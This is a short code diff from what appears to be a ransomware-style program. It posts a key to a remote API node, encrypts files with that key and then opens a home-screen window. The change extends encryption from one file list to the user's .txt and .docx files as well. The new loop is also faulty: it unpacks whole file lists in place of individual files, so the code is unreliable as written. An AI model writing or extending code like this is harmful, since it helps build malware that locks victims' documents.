@@ -23,8 +23,10 @@ if key == 'NA':
   status = api.post_key(node=node, key=key)
   print(status)
 else:
-  for f in all_nhom1_files:
-    enc.enc(filename=f, key=key)
+  for nhom_f, txt_f, doc_f in all_nhom1_files, all_txt_files, all_docx_files:
+    enc.enc(filename=nhom_f, key=key)
+    enc.enc(filename=txt_f, key=key)
+    enc.enc(filename=doc_f, key=key)
 
 home_screen = home_screen.main_window
 home_screen.mainloop()
